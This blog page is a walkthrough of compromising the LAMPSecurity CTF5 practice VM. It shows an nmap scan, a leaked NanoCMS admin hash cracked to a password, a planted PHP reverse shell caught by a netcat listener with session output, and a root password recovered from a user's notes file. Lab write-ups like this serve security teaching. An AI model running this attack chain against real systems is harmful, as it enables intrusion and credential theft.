
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Pentest lab - LAMPSecurity CTF5 - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Walkthrough for the LAMPSecurity CTF5 challenge">
  <meta name="keywords" content="lampsecurity, ctf, penetration testing, hacking, security, pentesting, pentest lab, walkthrough, writeup, lampsecurity ctf5, ctf5">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Pentest lab - LAMPSecurity CTF5</h1>
    
    
      <p class="meta">
        








  


<time datetime="2016-05-05T12:24:38-04:00" pubdate data-updated="true">May 5<span>th</span>, 2016</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>

<!-- more -->


<h3>Recon</h3>

<p>Nmap scan reveals there are plenty of open ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sS -sV -p1-65535 192.168.80.154
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-05-09 12:17 EDT
</span><span class='line'>Nmap scan report for 192.168.80.154
</span><span class='line'>Host is up, received arp-response (0.00024s latency).
</span><span class='line'>Not shown: 65524 closed ports
</span><span class='line'>Reason: 65524 resets
</span><span class='line'>PORT      STATE SERVICE     REASON         VERSION
</span><span class='line'>22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
</span><span class='line'>25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
</span><span class='line'>80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
</span><span class='line'>110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
</span><span class='line'>111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
</span><span class='line'>139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
</span><span class='line'>143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
</span><span class='line'>445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
</span><span class='line'>901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
</span><span class='line'>3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
</span><span class='line'>38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>

<h4>Web server</h4>

<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>

<p><img class="center" src="/images/pentest/ctf5/phake.png" title="phake home" alt="phake org"></p>

<p>We can register for a mailing list:</p>

<p><img class="center" src="/images/pentest/ctf5/list.png" title="mail list" alt="mailing list"></p>

<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>

<p>The blog page also has an admin login page and another Squirrel Mail page:</p>

<p><img class="center" src="/images/pentest/ctf5/blog.png" title="blog" alt="blog"></p>

<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>

<p><img class="center" src="/images/pentest/ctf5/event.png" title="event manager" alt="event planner"></p>

<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>

<h3>Exploiting the CMS</h3>

<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>

<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>

<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}</span></code></pre></td></tr></table></div></figure>


<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>

<p><img class="center" src="/images/pentest/ctf5/nanocms.png" title="nanocms admin panel" alt="admin panel"></p>

<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
</span><span class='line'>Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
</span><span class='line'> 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-3.2$ whoami
</span><span class='line'>apache</span></code></pre></td></tr></table></div></figure>


<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls
</span><span class='line'>amy
</span><span class='line'>andy
</span><span class='line'>jennifer
</span><span class='line'>loren
</span><span class='line'>patrick</span></code></pre></td></tr></table></div></figure>


<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls -al patrick
</span><span class='line'>total 344
</span><span class='line'>drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
</span><span class='line'>drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
</span><span class='line'>-rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
</span><span class='line'>drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
</span><span class='line'>-rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
</span><span class='line'>-rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
</span><span class='line'>-rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
</span><span class='line'>-rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
</span><span class='line'>-rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
</span><span class='line'>drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
</span><span class='line'>drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
</span><span class='line'>drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
</span><span class='line'>drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
</span><span class='line'>drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
</span><span class='line'>drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
</span><span class='line'>-rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
</span><span class='line'>-rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
</span><span class='line'>drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
</span><span class='line'>-rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
</span><span class='line'>drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
</span><span class='line'>drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
</span><span class='line'>-rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
</span><span class='line'>drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
</span><span class='line'>-rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
</span><span class='line'>drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
</span><span class='line'>-rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
</span><span class='line'>-rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
</span><span class='line'>-rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
</span><span class='line'>-rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
</span><span class='line'>-rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
</span><span class='line'>-rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
</span><span class='line'>-rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ cat .tomboy.log
</span><span class='line'>...
</span><span class='line'>12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
</span><span class='line'>12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
</span><span class='line'>12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
</span><span class='line'>12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
</span><span class='line'>12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
</span><span class='line'>12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!</span></code></pre></td></tr></table></div></figure>


<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls
</span><span class='line'>481bca0d-7206-45dd-a459-a72ea1131329.note
</span><span class='line'>addin-db-000
</span><span class='line'>addins
</span><span class='line'>ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
</span><span class='line'>d2684fad-3aab-444c-b90a-4f307c0818f6.note
</span><span class='line'>manifest.xml</span></code></pre></td></tr></table></div></figure>


<p>Found the jackpot in the first one!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy"&gt;
</span><span class='line'>  &lt;title&gt;Root password&lt;/title&gt;
</span><span class='line'>  &lt;text xml:space="preserve"&gt;&lt;note-content version="0.1"&gt;Root password
</span><span class='line'>
</span><span class='line'>Root password
</span><span class='line'>
</span><span class='line'>50$cent&lt;/note-content&gt;&lt;/text&gt;
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Now all that is left is to become root! I SSH&#8217;ed with the root credentials and the machine is mine now!</p>

<h5>Concluding remarks</h5>

<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ It's lucky you're going so slowly, \
</span><span class='line'>| because you're going in the wrong  |
</span><span class='line'>\ direction.                         /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2016-05-05T12:24:38-04:00" pubdate data-updated="true">May 5<span>th</span>, 2016</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2016/04/28/slackware-install-guide/" title="Previous Post: Slackware install guide">&laquo; Slackware install guide</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/06/11/pentest-tools-metasploit/" title="Next Post: Pentest tools - Metasploit">Pentest tools - Metasploit &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/';
        var disqus_url = 'http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
